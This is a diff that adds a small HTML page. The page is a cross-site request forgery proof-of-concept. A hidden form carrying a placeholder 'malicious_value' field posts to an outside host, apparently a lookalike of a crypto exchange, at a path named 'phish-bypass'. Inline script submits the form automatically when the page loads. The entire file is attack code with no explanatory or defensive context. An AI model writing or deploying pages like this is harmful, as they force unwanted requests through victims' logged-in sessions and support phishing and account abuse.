@@ -1,0 +1,11 @@
+<html>
+<body>
+    <form action="http://wave-okx.com/cdn-cgi/phish-bypass" method="POST">
+        <input type="hidden" name="vulnerable_param" value="malicious_value">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.forms[0].submit(); // Automatically submits the form
+    </script>
+</body>
+</html>
